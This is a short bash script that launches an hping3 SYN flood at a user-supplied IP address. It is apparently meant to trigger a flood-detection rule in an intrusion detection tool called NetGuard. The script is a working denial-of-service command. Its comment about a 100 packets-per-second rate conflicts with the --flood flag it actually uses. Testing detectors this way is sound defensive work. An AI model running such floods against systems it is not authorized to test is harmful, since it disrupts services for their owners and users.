#!/usr/bin/env bash
# attack_syn.sh — SYN Flood attack against the NetGuard target
#
# Requirements: hping3
#   sudo apt install hping3
#
# Usage: sudo bash attack_syn.sh <TARGET_IP>
# Example: sudo bash attack_syn.sh 192.168.1.50
#
# What it triggers: SynFloodRule fires when >=100 SYN packets from this
# source IP arrive within a 3-second window.

set -euo pipefail

TARGET="${1:-}"
if [[ -z "$TARGET" ]]; then
  echo "Usage: sudo bash attack_syn.sh <TARGET_IP>"
  exit 1
fi

echo "[*] Launching SYN flood against $TARGET (port 80)"
echo "[*] Sending 500 SYN packets at 100 pps — NetGuard should alert within ~3s"

# --syn        SYN flag
# --flood      send as fast as possible
# -p 80        destination port
# -S           SYN flag (alias)
# --count 500  send 500 packets
hping3 --syn --flood -p 80 --count 500 "$TARGET"

echo "[✓] SYN flood complete. Check the NetGuard dashboard for the alert."
